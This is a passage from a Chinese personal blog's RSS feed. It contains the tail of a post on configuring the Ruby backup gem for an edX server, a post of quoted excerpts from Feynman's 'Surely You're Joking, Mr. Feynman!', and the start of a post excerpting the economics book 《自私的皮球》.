    &lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#免密码ssh&lt;/span&gt;
    &lt;span class="c1"&gt;#每周为一轮，使用的是同名覆盖&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;%A&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;~/edx_backups/staticfile/&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;注意&lt;/h1&gt;
&lt;p&gt;~/Backup/log/backup.log 中的时间是ruby的时间，与本地差（晚）8个小时。时区的问题&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-04:use-backup-for-edx.html</guid><category>edx</category></item><item><title>别闹了，费曼先生</title><link>/Surely-You-are-Joking-Mr-Feynman.html</link><description>&lt;p&gt;---摘自理查德.费曼《别闹了，费曼先生》---&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他从没想过，一个小孩子居然有能耐静下来想，然后就想出将收音机修好的方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从小，只要一开始研究某个谜题，我便停不下来，非要把它解开不可。如果当时我母亲的朋友跟我说：“算了，这太费事了！”我一定大为光火，因为我非要击败这台鬼收音机不可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;同一天内其他人也会问我同样的问题，那时我却可以不加思索便告诉他们答案。因此我在替第一个人解题时花掉20分钟，可是同时却有5个人以为我是超级天才！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;高中念完时，恐怕古往今来的每个谜我都碰过了，总之凡是由人类想出来的任何疯狂古怪谜题我都晓得。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果我要跟别人讨论，便必须使用大家都知道的标准符号&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们连自己究竟“知道”什么都不清&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有些时候，我真搞不清楚人是怎么回事：他们都不是透过了解而学习，而是靠背诵死记或其他方法，因此知识的基础都很薄弱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;很多人常常觉得我是个骗子，但事实上我都很诚实，只不过，我常常诚实得没有人相信而已！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我确实曾经想过“以科学技巧来解决问题”可能会有的种种限制，像道德价值就不可能靠科学方法来评定等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;（入睡过程）因此各种逻辑幻象都会出现，但你的思想很快便不受控制，独断独行，全不相连，然后，你就睡着了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论你说的是诗的哪一方面，我总有办法从任何事物的角度说出一大堆对比关系，就像刚刚的理论物理一样。不过，我并不觉得这些对比推论，有任何意义&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我发现，被催眠的经验确实非常有趣。在整个过程中，你不停地对自己说：“我当然可以做这、做那，我只是不想那样做而已！”——那却等于说：你做不到。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;电子只不过是我们使用的一种理论，但对于帮助我们了解宇宙运作十分有用，有用到我们简直认为电子是真实无讹的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“你们都知道？难怪你们念了四年的生物，我却还是一下子便追上你们的程度了。”他们把所有时间都浪费在死背名词上了，而这些东西只要花个15分钟便全部可以查出来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对我来说，真正的男子汉大丈夫，是不会把心思放在诗呀、歌呀这类事情上的。我甚至从没有想过，到底诗是怎么写出来的！我比较欣赏钢铁工人、焊工或机器房的技工。我常常觉得，那些在机器房里工作、能够制造出东西来的人，才是真正的男子汉！那就是我当年的心态。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这种场面太令我震惊了：这群人提出一大堆想法，各自考虑不同的层面，却同时记得其他人说过些什么，到了最后，又能就哪个想法最佳，作出决定，并综合全体意见，不必什么都重复三遍！这些人实在很了不起。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;现在他们却碰壁了。这时我便使出“积分符号内取微分”的方法——这是因为我有一个与众不同的工具箱，还没法找到解答时，便把问题交给我了！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;看看你这副模样，衣服袖口脏兮兮的、随随便便的，就在谈论这件惊天动地的大事情！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你猜我动了什么脑筋？我跑去看女生宿舍的位置，然后挑了一间和她们正对面的房间。不过，后来我发现这个房间的窗外正好有一棵树，视线全被挡住了！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我必须慢慢厘清发生在阿琳身上的是怎么一回事——以致于一直到好几个月之后才哭出来。那时我在橡树岭，刚巧路过一家百货公司，看到橱窗内的洋装，心想阿琳一定会喜欢其中一件，就再也按捺不住了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一生之中最令我振奋的经验之一，就是碰到这些光芒四射的物理学家&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;冯诺曼教会了我一个很有趣的想法：你不需要为身处的世界负任何责任。因此我就形成了强烈的“社会不负责任感”，从此成为一个快活逍遥的人。大家听好了，我的不负责任感全都是由于冯诺曼在我思想上撒下的种子而起的！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在这方面我总是笨笨的。我总是忘记在跟谁说话，而一味担心物理上的问题。如果对方的想法差劲，我就告诉他那很差劲。如果他的想法很好，我就说很好。就那么简单，这就是我的处事方式。我觉得那样很好，很愉快——大前提是你要做得到。我很幸运正是这样的一个人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;（原子弹试验之后）在路上走着时，看到有人在盖桥、筑路，我又想：他们都是神经病，什么都不懂，干嘛还要盖新的东西？一切都是白费工夫而已&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我最喜欢玩益智游戏了：如果有人发明了一些东西把别人挡在外头，那么就应该有办法破解它，闯进去！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“你觉得你的生命有多少价值？” “64。” “为什么你说64？” “生命价值能用数量的吗？” “不！我是说，你为什么说‘64’，而不是——比如说——‘73’？” “如果我刚才说‘73’，你也会问我同样问题呀！”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;第二个医师很显然较为伟大，因为他的字更潦草难懂。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在课堂上时，你可以思考一些已经很清楚的基本东西。这些知识是很有趣、令人愉快的，重温一遍又何妨？另一方面，有没有更好的介绍方式？有什么相关的新问题？你能不能赋予这些旧知识新生命？基本的东西思考起来并不难；而如果你没想出什么新东西来，没关系，以前想过的已足以应付讲课之用了。但如果你真的有什么新想法，能从新角度看事物，你会觉得很愉快。 学生问的问题，有时也能提供新的研究方向。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这是个极为高明的想法：你完全没有责任要做到其他人觉得你应该做到的地步。我没有责任要符合他们的期望，这是他们的错，可不是我失败了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;目前我有点厌烦物理，但从前我很能够享受物理的乐趣。为什么会这样呢？因为从前我都在跟它玩游戏。从前我随兴之所至——我不会忧虑这究竟对核子物理的发展是否重要，只会想这是否有趣，好不好玩。还在念高中时，看到水龙头流出来的水流逐渐变少，我很好奇能不能研究出它的曲线，而我发现那并不难。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他说：“费曼，那很有趣，但那有什么重要？你为什么要研究它？”&lt;br /&gt;
“哈！”我说：“那没什么重要，我只是觉得好玩而已。”他的反应丝毫没有使我泄气，我已经下定决心，我要享受物理，随兴之所至。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一切是那么毫不费力，这些题目玩起来是那么容易，就好像打开瓶盖一样，所有东西都毫无阻塞地流出来。我差点产生抵抗之心了！我做的毫无意义，可是结果呢，却恰好相反：后来我获颁诺贝尔奖的原因——费曼图以及其他的研究——全都来自那天我把时光“浪费”在一个转动的餐碟上！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是我突然省悟：那35美元的功能，是要使得水牛城之行更有吸引力，而正确的方法就是把它花掉。因此我决定，每次飞到水牛城授课时，都要花掉那35美元，享受一下，看看会不会使行程更为值得。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们都对我崇敬有加。我不能喝酒，但仍然有胆走进酒吧里，面对所有的诱惑，只点了杯可乐来喝。这一切当然是因为我要来看我的朋友。我那样足足装了有一个月之久，真是够卑鄙！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有一次我进洗手间，有个醉鬼正在小便。他用一种卑劣的声音跟我说：“我很讨厌你这张脸，我想把你的脸按到你的头里去。”&lt;br /&gt;
　　我吓得脸变绿了。但我用同样卑劣的声音回答说：“滚开，别挡我的路，不然我就尿在你身上了！”&lt;br /&gt;
　　他又说了些话，情况愈来愈接近打架边缘。但我从来没有跟人打过架，不太知道要怎么打，更害怕会受伤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但无论有多灵验，以后我再也没那样做了——我不喜欢那样尔虞我诈。但整个经验最有趣的，是发现世界上有许多事情的运作方式，跟我从小被教导的一套，居然会有这样大的差异！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我一向从思考过程中获得许多的乐趣，以致很不愿意破坏这部生命中最好玩的机器——换句话说，自己的身体。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;首先我把科学定义为“对大自然现象的理解”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;费曼，我这里多一辆车，借给你。另外这是到好莱坞及日落区的地图，好好享受吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个人年轻的时候，你有很多事情要担心：要不要到这个地方，你的母亲又会怎样等等。你担心、做决定，但又发生了其他的事情。事实上，比较容易的作法是什么都不管，就那样决定。不用管那么多——再没什么能使你改变主意了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“等一下”我说，“你讲的问题有没有什么例子？” “当然有。” “很好，那么就举一个例子。”这是我的作风：除非我脑袋里能出现一个具体的例子，然后根据这个特例来演算下去，否则我无法理解他们说的东西。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我脑中想的，是他正在分析的理论中某个特定、实际的例子，而根据过去经验和直觉，我很清楚这例子的特性。所以当方程式应该会如何如何，我知道那是一步错误的推论，于是跳起来说：“等一下！那里有个错误！”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们经常讨论艺术和科学。我会说：“艺术家是迷失的一群，他们没有任何实在的对象！他们曾经以宗教为对象，但是现在他们失去了宗教，一无所有。他们不了解眼前的科技世界，他们一点也不懂得真实世界之美——亦即科学世界之美——所以在内心深处，他们根本没有东西可画。”&lt;br /&gt;
而左赐恩则会回答说，艺术家不需要具体的实物，他们满是各种可以用艺术表达的感情；而且艺术可以是非常抽象的，更何况当科学家把自然分解成数学方程式时，他们同时也摧毁了自然之美&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我很想表达内心深处对这个世界之美的感受，这感受很难形容清楚，因为那是一种情感，这很类似一个人对宗教的感觉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;各行其是的万物却都被“幕后”同样的组织体、同样的物理定律所管辖，你会觉得这世界一定有种运行的通则。这是种对大自然数字之美的感情，对于她内在运作方式之妙的赞叹；了解到我们所见的种种现象，都是源自原子之间复杂的相互作用，更有感于大自然的美妙和奇幻。这是一种敬畏的感觉——对科学的敬畏。我觉得，透过绘画，我可以和有同感的人沟通这份情感&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;绘画老师不愿意逼迫你往特定的方向走，所以他们碰到的沟通问题是，怎么让学生慢慢领悟出绘画的技巧，而不是单靠传授；但物理教师却老在传授解物理习题的技巧，而不是从物理的精神层面来启发学生&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们总是不断叫我画画时，要更放松一点。但是，我觉得叫一个刚学开车的人放松驾驶盘，是不大说得通的。所以，我很反对这种不停的叫人放松的说&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这幅画的美就在于画家几笔挥毫下，竹子就浑然天成，我可以在真实与假象之间流连忘返。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;至少在某个层面上，我终于了解到艺术究竟是为什么而存在。艺术能为人带来快乐；你创造的东西可以令人喜爱到得而喜，失而沮丧！科学却是普遍性的、宏观的，你不大会跟那些欣赏科学的人有个别而直接的认识。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我更了解到卖画不是为了赚钱，而是让真正想要这幅画的人可以把画买回家，是让那些得不到这幅画就很难过的人能拥有这幅画，真是有趣极了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我从她身上学到的是，不管长得多美，每个女人都在担心自己的外貌。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你应该把价钱提高3倍。没有人能真正确定艺术品的价值，所以通常他们会想，‘价钱愈高，一定愈有价值！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;最后我问：“跟知识的支离破碎相关的，到底是哪些道德问题？”他的回答却只是一团团的迷雾，我说：“我听不懂，”但其他人都表示他们全听得懂，并且试着要解释给我听，但他们根本说不明白！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我在尝试把问题定义清楚。研讨会之所以开得毫无头绪，主要是因为他们连题目都没有明确地界定，因此大家都不知道应该说什么&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"你看，我是速记员，我把大家说的每一句话都记录下来。但他们说的我全都听不懂，而每次你站起来问问题或者说些什么，我却能完全明白你说些什么。因此我原本以为你不可能是个教授！ "&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“秩序可不可以从混乱中产生？”可以？不可以？该说些什么&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但经过伪装的笨蛋——明明是笨蛋却假装不是，拼命想叫别人佩服他们，希望别人觉得他们聪明、伟大——这，我受不了！一般的笨蛋并不会骗人，诚实的笨蛋都很不错；但是，不诚实的笨蛋便糟糕透了！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们说：“唔，比如说，究竟电是不是火？”&lt;br /&gt;
“不，”我说：“但……问题到底是什么？”  &lt;br /&gt;
他们说：“法典里说，你不能在星期六生火。我们的问题是，我们在星期六能不能用电器？”&lt;br /&gt;
我呆住了。他们不是对科学有兴趣！科学对他们生活所带来的影响，只不过是能否让他们将犹太法典诠释得更好而已！他们并不是对外面的世界及自然现象有兴趣，他们只是有兴趣解决一些由于法典而引起的问题！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这真是令人失望。这些人的人生才刚开始，但他们的生命却都用在诠释犹太法典。想想看，在今天的年代，大家学习的目的是加入社会，做些事情——就算是作个犹太牧师。但令他们对科学产生兴趣的唯一原因，却只不过是由于那些古老、狭窄、从中古时代遗留下来的问题，在面对新现象时碰到其他问题，就这样而已！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;物理学家既然有办法从铀里取得能量，那么我能不能想出以二氧化硅——就是泥沙——为燃料的方法？如果做得到，那么坦克车只要在车底上装个小铲，一边走一边把泥沙弄起来当燃料就行了！他觉得这个主意棒极了，而我要做的，只不过是把细节设计出来便好了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;居然没有一本提到算术在科学上的应用。如果它们真提及算术的任何应用，他们举的例子也不过是买邮票之类。大多数的时候，它们讨论的都是些抽象的新数学废话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;整件事的目的，只不过是引导学生练习加法而已，但他们根本不知道自己在说什么。这情形就好像你在读书，偶尔句子会出现几个错误，但突然有一整个句子都印反了。那些数学课本就是那个样子，简直没希望！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中国皇帝高高在上，平民百姓都无缘得见。好了，现在的问题是，皇帝的鼻子有多长？于是有人走遍全中国，问了千千万万的人：大家认为皇帝鼻子有多长，再取其中平均值；而由于他平均了这么多人的数字，大家就相信这答案很“准确”了。但这是什么烂方法嘛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们应该做的是让学生看看玩具的内部，看看里头的发条，学学齿轮，不要管什么“能量”了。往后，当这小孩明白玩具到底如何运作，他们就可以讨论较为普遍的能量定律了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我有个很有钱的朋友，他提到这些捐钱设立奖金或赞助演讲的人时说:"小心观察，看看他们到底做过什么违背良心的事情，需要靠这来减轻罪恶"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我年轻的时候，十分反文化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有时候我会把鼓带到远处森林里，以免吵着别人，在那里找根棒子击鼓唱歌。记得有一次我围绕着一棵树，看着月亮，边走边打鼓，想像自己是个印第安人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我甚至曾经想过要试迷幻药，但我有点怕那样做：我喜欢思考，因此我不想弄坏“我”这部机器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在中古世纪期间，各种疯狂荒谬的想法可谓层出不穷，例如犀牛角可以增进性能力，就是其中之一。随后有人发现了过滤想法的方法，试验哪些构想可行、哪些不可行，把不可行者淘汰掉。当然，这个方法逐渐发展成为科学。它一直发展得很好，我们今天已经进入科学时代了。事实上，我们的年代是那么的科学化，有时候甚至会觉得难以想象，以前怎么可能出现过巫医，因为他们所提出的想法全都行不通——至多只有少数的想法是行得通的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;上面提到的一些教育或心理学上的研究，都是属于我称之为“草包族科学”（cargo cult science）的最佳例子。大战期间在南太平洋有一些土人，看到飞机降落在地面，卸下来一包包的好东西，其中一些是送给他们的。往后他们仍然希望能发生同样的事，于是他们在同样的地点铺飞机跑道，两旁还点上了火，盖了间小茅屋，派人坐在那里，头上绑了两块木头（假装是耳机）、插了根竹子（假装是天线），以为这就等于控制塔里的领航员了——然 后他们等待、等待飞机降落。他们被称为草包族，他们每件事都做对了、一切都十分神似，看来跟战时没什么两样； 但这行不通：飞机始终没有降落下来。这是为什么我叫这类东西为“草包族科学”，因为它们完全学足了科学研究的外表，一切都十分神似，但是事实上它们缺乏了最重要的部分——因为飞机始终没有降落下来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那就是当你以科学家的身份讲话时，千万不要欺骗大众。我不是指当你骗了你妻子或女朋友时应该怎么办，这时你的身份不是科学家，而是个凡人，我们把这些问题留给你和你的牧师。我现在要说的是很特别、与众不同、不单只是不欺骗别人，而且还尽其所能说明你可能是错了的品德，这是你作为科学家所应有的品德；这是我们作为科学家，对其他科学家以及对非科学家，都要负起的责任。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 02 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-02:Surely-You-are-Joking-Mr-Feynman.html</guid><category>book</category></item><item><title>自私的皮球.第一部分</title><link>/zi-si-de-pi-qiu-1.html</link><description>&lt;p&gt;---摘自辉格《自私的皮球》---&lt;/p&gt;
&lt;h2&gt;第一部分 价格与市场&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;经济学这个箱子里装的工具并不多。首先是激励分析，或者叫成本收益分析.所谓激励，就是一个人决定做某件事之前，对它可能带来的后果做预期时所考虑的因素。后果分两方面：收益和代价&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;其次是资源识别。资源识别是要回答这样的问题：他是凭什么赚到钱的？按经济学观点，只有未预期到的收入才算利润，所有预期中的收入都是资源从其所投入的生产中分得的租金，如工资是劳动力的租金，利息是现金的租金，版税是著作权的租金等。假如某项可预期收入还未被找出对应的资源，便说明我们对有关生产模式尚未获得透彻的理解，由这一视角所产生的好奇心将引导我们考察各种商业模式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;然后是均衡分析。均衡理论的意义在于引导我们去考察那些看似不均衡的现象。如某个行当看似钱很好赚，却没有大批新进者把价格和利润拉低&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;还有就是信息与风险分析。参与者会想出各种办法来处理风险&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;价格在经济活动的组织中发挥三个作用：首先，它们传递信息；其次，它们激励生产者采用成本最低的方法；第三，它们决谁从生产过程中获得多少   --弗里德曼《自由选择》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们须将价格视为这样的一种信息交换机制...其最奇妙之处在于它处理信息的经济性:它让个体参与者可以知道的如此之少，却能够做出恰当的行动   --哈耶克 “社会中的知识使用”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;买家和卖家都或多或少能找出些机会来谋求更有利的价格，而带来这种机会的，通常是商品之间的差异和信息条件的复杂性或不对等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;耐用品和消耗品之间如何恰当地分配销售收入流？将收入流分割得尽量与实际使用频率相匹配，可降低用户的购买门槛，降低其采购的决策风险，从而尽快占领市场。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;设备维护交易中涉及的故障责任和维修工作很难厘定，耗材用量恰好为此提供了简易的度量手段。这是旨在克服信息障碍的合约安排。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Toro公司推出一项名为“雪中送炭”的扫雪机促销计划，消费者需要多花一点钱购买扫雪机，但如果今年降雪量少于历史平均水平的20%，将全额退款... 内尔指出，它们愿意为此付钱，而他们多花的钱所买到的，其实不过是后悔药。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;贝尔的分析提示我们注意某些消费心理学现象，在价格策略中，焦点之一是如何消除客户做决策时的种种顾虑，有些价格安排将直接降低客户的风险，而另一些则只是用来克服他们心理上的障碍&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你喜欢某个饭店的美食和环境，又能抵御住酒水促销员的诱惑，便能以低廉的价格享受到优质的菜肴和服务。这不正是那些提倡节俭消费、反对酗酒、鼓励照顾低收入者的政治家们所希望看到的结果吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;开瓶费禁令将迫使餐馆压低酒价并提高菜价，从而消除原有的廉价消费机会，其损害的将是那些低收入消费者和喝酒较少的女性消费者，而同时又鼓励了酗酒。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;某些大排档便是如此，那里的食物价格低到令人瞠目，老板是靠向酒商收取入场费来盈利的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每一种结构化定价方式背后，都隐藏这一个精妙的商业模式和它的演化故事，简单地将之归结为商人的贪婪是不得要领的&lt;/p&gt;
&lt;/blockquote&gt;
